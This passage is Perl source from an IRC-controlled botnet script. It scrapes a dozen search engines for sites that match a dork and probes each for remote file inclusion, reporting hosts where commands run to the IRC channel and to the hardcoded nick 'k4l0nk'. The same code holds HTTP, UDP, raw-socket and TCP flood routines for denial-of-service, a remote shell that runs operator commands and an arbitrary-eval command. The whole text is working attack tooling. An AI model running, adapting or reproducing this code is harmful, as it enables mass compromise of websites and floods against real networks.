sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4aLtaviSta12)7 sCaN fiNniShed for $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(7);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /k4l0nk/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 7OFF14): 4$print ");
sendraw($IRC_cur_socket, "PRIVMSG k4l0nk :14(2Safe Mode = 7OFF14): 4$print ");
}}
elsif($re =~ /k4l0nk/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 3ON14): 12$print ");
}}
}}}
exit;
}}

#
if ($funcarg =~ /^rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @naver=&naver($dork);
push(my @tot, @naver );
my @puliti=&unici(@tot);
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4nAvEr12) 2".scalar(@tot)." 3sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4nAvEr12)7 wE have cLeaNed 2".scalar(@puliti)." 3sites");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %50==0){
#sendraw($IRC_cur_socket, "PRIVMSG $printl :3Exploiting1 ".$contatore." 3of1 ".$uni. " 3Sites");
}
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4nAvEr12)7 sCaN fiNniShed for $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(7);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /k4l0nk/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 7OFF14): 4$print ");
sendraw($IRC_cur_socket, "PRIVMSG k4l0nk :14(2Safe Mode = 7OFF14): 4$print ");
}}
elsif($re =~ /k4l0nk/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 3ON14): 12$print ");
}}
}}}
exit;
}}

#
if ($funcarg =~ /^rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @baidu=&baidu($dork);
push(my @tot, @baidu );
my @puliti=&unici(@tot);
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4bAidu12) 2".scalar(@tot)." 3sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4bAidu12)7 wE have cLeaNed 2".scalar(@puliti)." 3sites");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %50==0){
#sendraw($IRC_cur_socket, "PRIVMSG $printl :3Exploiting1 ".$contatore." 3of1 ".$uni. " 3Sites");
}
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4bAidu12)7 sCaN fiNniShed for $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(7);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /k4l0nk/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 7OFF14): 4$print ");
sendraw($IRC_cur_socket, "PRIVMSG k4l0nk :14(2Safe Mode = 7OFF14): 4$print ");
}}
elsif($re =~ /k4l0nk/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 3ON14): 12$print ");
}}
}}}
exit;
}}

#
if ($funcarg =~ /^rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @fireball=&fireball($dork);
push(my @tot, @fireball );
my @puliti=&unici(@tot);
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4fiRebaLL12) 2".scalar(@tot)." 3sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4fiRebaLL12)7 wE have cLeaNed 2".scalar(@puliti)." 3sites");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %50==0){
#sendraw($IRC_cur_socket, "PRIVMSG $printl :3Exploiting1 ".$contatore." 3of1 ".$uni. " 3Sites");
}
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4fiRebaLL12)7 sCaN fiNniShed for $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(7);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /k4l0nk/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 7OFF14): 4$print ");
sendraw($IRC_cur_socket, "PRIVMSG k4l0nk :14(2Safe Mode = 7OFF14): 4$print ");
}}
elsif($re =~ /k4l0nk/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 3ON14): 12$print ");
}}
}}}
exit;
}}

#
if ($funcarg =~ /^rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @guruji=&guruji($dork);
push(my @tot, @guruji );
my @puliti=&unici(@tot);
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4guRuji12) 2".scalar(@tot)." 3sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4guRuji12)7 wE have cLeaNed 2".scalar(@puliti)." 3sites");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %50==0){
#sendraw($IRC_cur_socket, "PRIVMSG $printl :3Exploiting1 ".$contatore." 3of1 ".$uni. " 3Sites");
}
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4guRuji12)7 sCaN fiNniShed for $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(7);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /k4l0nk/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 7OFF14): 4$print ");
sendraw($IRC_cur_socket, "PRIVMSG k4l0nk :14(2Safe Mode = 7OFF14): 4$print ");
}}
elsif($re =~ /k4l0nk/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 3ON14): 12$print ");
}}
}}}
exit;
}}

#
if ($funcarg =~ /^rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @mozbot=&mozbot($dork);
push(my @tot, @mozbot );
my @puliti=&unici(@tot);
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4mOzBot12) 2".scalar(@tot)." 3sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4mOzBot12)7 wE have cLeaNed 2".scalar(@puliti)." 3sites");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %50==0){
#sendraw($IRC_cur_socket, "PRIVMSG $printl :3Exploiting1 ".$contatore." 3of1 ".$uni. " 3Sites");
}
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4mOzBot12)7 sCaN fiNniShed for $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(7);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /k4l0nk/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 7OFF14): 4$print ");
sendraw($IRC_cur_socket, "PRIVMSG k4l0nk :14(2Safe Mode = 7OFF14): 4$print ");
}}
elsif($re =~ /k4l0nk/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 3ON14): 12$print ");
}}
}}}
exit;
}}

#
if ($funcarg =~ /^rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @ylist=&yahoo($dork);
	my @yalist=&yahooa($dork);
	my @yblist=&yahoob($dork);
	my @yclist=&yahooc($dork);
	my @ydlist=&yahood($dork);
		push(my @yahoobypass, @ylist, @yalist, @yblist, @yclist, @ydlist );
push(my @tot, @yahoobypass );
my @puliti=&unici(@tot);
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4yaHoo12) 2".scalar(@tot)." 3sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4yaHoo12)7 wE have cLeaNed 2".scalar(@puliti)." 3sites");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %50==0){
#sendraw($IRC_cur_socket, "PRIVMSG $printl :3Exploiting1 ".$contatore." 3of1 ".$uni. " 3Sites");
}
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4yaHoo12)7 sCaN fiNniShed for $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(7);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /k4l0nk/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 7OFF14): 4$print ");
sendraw($IRC_cur_socket, "PRIVMSG k4l0nk :14(2Safe Mode = 7OFF14): 4$print ");
}}
elsif($re =~ /k4l0nk/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 3ON14): 12$print ");
}}
}}}
exit;
}}

######################
#     HTTPFlood      #
#                    #
######################
if ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2HttpFlood14)3 Attacking 14 ".$1." 2 on port 80 for 14 ".$2." 3 seconds .");
my $itime = time;
my ($cur_time);
$cur_time = time - $itime;
while ($2>$cur_time){
$cur_time = time - $itime;
my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
close($socket);
}
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2HttpFlood14)3 Attacking selesai 14 ".$1.".");
}
######################
#  End of HTTPFlood  #
#                    #
######################

######################
#     UDPFlood       #
#                    #
######################
if ($funcarg =~ /^udpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2UDPFlood14)3 Attacking 14 ".$1." 3 with 4 ".$2." 3 Kb Packets for 14 ".$3." 3 seconds.");
my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
$dtime = 1 if $dtime == 0;
my %bytes;
$bytes{igmp} = $2 * $pacotes{igmp};
$bytes{icmp} = $2 * $pacotes{icmp};
$bytes{o} = $2 * $pacotes{o};
$bytes{udp} = $2 * $pacotes{udp};
$bytes{tcp} = $2 * $pacotes{tcp};
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2UDPFlood14)3 Results 14 ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 3Kb in14 ".$dtime." 3seconds to14 ".$1.".");
}
exit;

######################
#  End of Udpflood   #
#                    #
######################


sub ircase {
my ($kem, $printl, $case) = @_;
  if ($case =~ /^join (.*)/) {
     j("$1");
   }
   if ($case =~ /^part (.*)/) {
      p("$1");
   }
if ($case =~ /^rejoin\s+(.*)/) {
my $chan = $1;
if ($chan =~ /^(\d+) (.*)/) {
for (my $ca = 1; $ca <= $1; $ca++ ) {
p("$2");
j("$2");
}
}
else {
p("$chan");
j("$chan");
}
}

if ($case =~ /^op/) {
op("$printl", "$kem") if $case eq "op";
my $oarg = substr($case, 3);
op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
}

if ($case =~ /^deop/) {
deop("$printl", "$kem") if $case eq "deop";
my $oarg = substr($case, 5);
deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
}

if ($case =~ /^msg\s+(\S+) (.*)/) {
msg("$1", "$2");
}

if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
for (my $cf = 1; $cf <= $1; $cf++) {
msg("$2", "$3");
}
}

if ($case =~ /^ctcp\s+(\S+) (.*)/) {
ctcp("$1", "$2");
}

if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
for (my $cf = 1; $cf <= $1; $cf++) {
ctcp("$2", "$3");
}
}

if ($case =~ /^nick (.*)/) {
nick("$1");
}

if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
conectar("$2", "$1", 6667);
}

if ($case =~ /^raw (.*)/) {
sendraw("$1");
}

if ($case =~ /^eval (.*)/) {
eval "$1";
}
}


sub shell {
my $printl=$_[0];
my $comando=$_[1];
if ($comando =~ /cd (.*)/) {
chdir("$1") || msg("$printl", "No such file or directory");
return;
}

elsif ($pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) {
exit;

} else {
my @resp=`$comando 2>&1 3>&1`;
my $c=0;
foreach my $linha (@resp) {
  $c++;
  chop $linha;
  sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
  if ($c == "$linas_max") {
    $c=0;
    sleep $sleep;
  }
}
exit;
}
}
}

sub tcpflooder {
my $itime = time;
my ($cur_time);
my ($ia,$pa,$proto,$j,$l,$t);
$ia=inet_aton($_[0]);
$pa=sockaddr_in($_[1],$ia);
$ftime=$_[2];
$proto=getprotobyname('tcp');
$j=0;$l=0;
$cur_time = time - $itime;
while ($l<1000){
$cur_time = time - $itime;
last if $cur_time >= $ftime;
$t="SOCK$l";
socket($t,PF_INET,SOCK_STREAM,$proto);
connect($t,$pa)||$j--;
$j++;$l++;
}
$l=0;
while ($l<1000){
$cur_time = time - $itime;
last if $cur_time >= $ftime;
$t="SOCK$l";
shutdown($t,2);
$l++;
}
}



sub udpflooder {
my $iaddr = inet_aton($_[0]);
my $msg = 'A' x $_[1];
my $ftime = $_[2];
my $cp = 0;
my (%pacotes);
$pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
return(undef) if $cp == 4;
my $itime = time;
my ($cur_time);
while ( 1 ) {
for (my $porta = 1;
$porta <= 65000; $porta++) {
$cur_time = time - $itime;
last if $cur_time >= $ftime;
send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;


for (my $pc = 3;
$pc <= 255;$pc++) {
next if $pc == 6;
$cur_time = time - $itime;
last if $cur_time >= $ftime;
socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
}
}
last if $cur_time >= $ftime;
}
return($cur_time, %pacotes);
}

sub ctcp {
return unless $#_ == 1;
sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}

sub msg {
return unless $#_ == 1;
sendraw("PRIVMSG $_[0] :$_[1]");
}

sub notice {
return unless $#_ == 1;
sendraw("NOTICE $_[0] :$_[1]");
}

sub op {
return unless $#_ == 1;
sendraw("MODE $_[0] +o $_[1]");
}

sub deop {
return unless $#_ == 1;
sendraw("MODE $_[0] -o $_[1]");
}

sub j {
&join(@_);
}

sub join {
return unless $#_ == 0;
sendraw("JOIN $_[0]");

}
sub p { part(@_);
}

sub part {
sendraw("PART $_[0]");
}

sub nick {
return unless $#_ == 0;
sendraw("NICK $_[0]");
}

sub quit {
sendraw("QUIT :$_[0]");
}

sub fetch(){
my $rnd=(int(rand(9999)));
my $n= 80;
if ($rnd<5000) { $n<<=1;}
my $s= (int(rand(10)) * $n);
{
my @dominios = ("removed-them-all");
my @str;
foreach $dom  (@dominios)
{
push (@str,"@gstring");
}
my $query="www.google.com/search?q=";
$query.=$str[(rand(scalar(@str)))];
$query.="&num=$n&start=$s";
my @lst=();
sendraw("privmsg #debug :DEBUG only test googling: ".$query."");
my $page = http_query($query);
while ($page =~  m/<a href=\"?http:\/\/([^>\"]+)\"? class=l>/g){
if ($1 !~ m/google|cache|translate/){
push (@lst,$1);
}
}
return (@lst);
}

sub msn(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&first=".$b."&FORM=PERE");
my $Res=query($MsN);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub yahoo(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=100){
my $Ya=("http://search.yahoo.co.in/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub yahooa(){
my @lst;
my $key = $_[0];
for($b=210;$b<=1000;$b+=210){
my $Ya=("http://search.yahoo.hk/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub yahoob(){
my @lst;
my $key = $_[0];
for($b=410;$b<=1000;$b+=210){
my $Ya=("http://search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub yahooc(){
my @lst;
my $key = $_[0];
for($b=610;$b<=1000;$b+=210){
my $Ya=("http://search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub yahood(){
my @lst;
my $key = $_[0];
for($b=810;$b<=1000;$b+=210){
my $Ya=("http://search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub baidu(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=50){
my $baidu=("http://www.baidu.com/s?lm=0&si=&rn=50&wd=".key($key)."&pn=".$b);
my $Res=query($baidu);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub altavista(){ 
my @lst; 
my $key = $_[0]; 
for($b=1;$b<=1000;$b+=10){ 
my $AlT=("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b); 
my $Res=query($AlT); 
while($Res=~m/<span class=ngrn>(.+?)\//g){ 
if($1 !~ /altavista/){ 
my $k=$1; 
$k=~s/<//g; 
$k=~s/ //g; 
my @grep=links($k); 
push(@lst,@grep); 
}}
if ($Res =~ /target=\"_self\">Succ/){}
else{return @lst;}
} 
return @lst; 
}

sub naver(){ 
my @lst; 
my $key = $_[0]; 
for($b=1;$b<=1000;$b+=10){ 
my $naver=("http://web.search.naver.com/search.naver?where=webkr&query=".key($key)."&xc=&docid=0&qt=df&lang=all&f=&r=&st=s&fd=2&start=".$i); 
my $Res=query($naver); 
while($Res =~ m/<a href=\"http:\/\/([^>\"]*)/g){ 
my $k=$1; 
if($k!~/busca|uol|yahoo/){ 
my $k=$1; 
my @grep=links($k); 
push(@lst,@grep); 
}}} 
return @lst; 
}

sub mozbot() 
{ 
my @lst; 
my $key=$_[0]; 
my $i=0; 
my $pg=0; 
for($i=0; $i<=100; $i+=1) 
{ 
my $mozbot=("http://www.mozbot.fr/search?q=".key($key)."&st=int&page=".$i); 
my $Res=query($mozbot); 
while($Res =~ m/<a href=\"?http:\/\/(.+?)\" target/g){ 
my $k=$1; 
$k=~s/ //g; 
my @grep=links($k); 
push(@lst,@grep); 
}
if ($Res =~ /Cliquez ici pour effectuer/)
{return @lst;}
} 
return @lst; 
} 

sub uol(){ 
my @lst; 
my $key = $_[0]; 
for($b=1;$b<=1000;$b+=10){ 
my $UoL=("http://busca.uol.com.br/www/index.html?q=".key($key)."&start=".$i); 
my $Res=query($UoL); 
while($Res =~ m/<a href=\"http:\/\/([^>\"]*)/g){ 
my $k=$1; 
if($k!~/busca|uol|yahoo/){ 
my $k=$1; 
my @grep=links($k); 
push(@lst,@grep); 
}}} 
return @lst; 
} 

sub ask(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=10)
{
my $Ask=("http://it.ask.com/web?q=".key($key)."&o=312&l=dir&qsrc=0&page=".$i."&dm=all");
my $Res=query($Ask);
while($Res=~m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g){
my $k=$3;
$k=~s/[\"\ ]//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub alltheweb()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=100)
{
my $all=("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i);
my $Res=query($all);
while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub google(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.com/search?hl=en&q=".key($key)."&meta=&num=100&filter=0&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub guruji(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=10){
my $guruji=("http://www.guruji.com/search?q=".key($key)."&s=".$b);
my $Res=query($guruji);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub fireball(){
my $key=$_[0];
my $inizio=1;
my $pagine=200;
my @lst;
my $av=0;
while($inizio <= $pagine){
my $fireball="http://suche.fireball.de/cgi-bin/pursuit?pag=$av&query=".key($key)."&cat=fb_loc&idx=all&enc=utf-8";
my $Res=query($fireball);
while ($Res=~ m/<a href=\"?http:\/\/(.+?)\//g ){
if ($1 !~ /msn|live|google|yahoo/){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
$av=$av+10;
$inizio++;
}
return @lst;
}

sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
return $chiave;
}

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}
return @unici;
}

sub http_query($){
my ($url) = @_;
my $host=$url;
my $query=$url;
my $page="";
$host =~ s/href=\"?http:\/\///;
$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query =~s/$host//;
if ($query eq "") {$query="/";};
eval {
local $SIG{ALRM} = sub { die "1";};
alarm 10;
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
alarm 0;
close($sock);
};
return $page;
}
}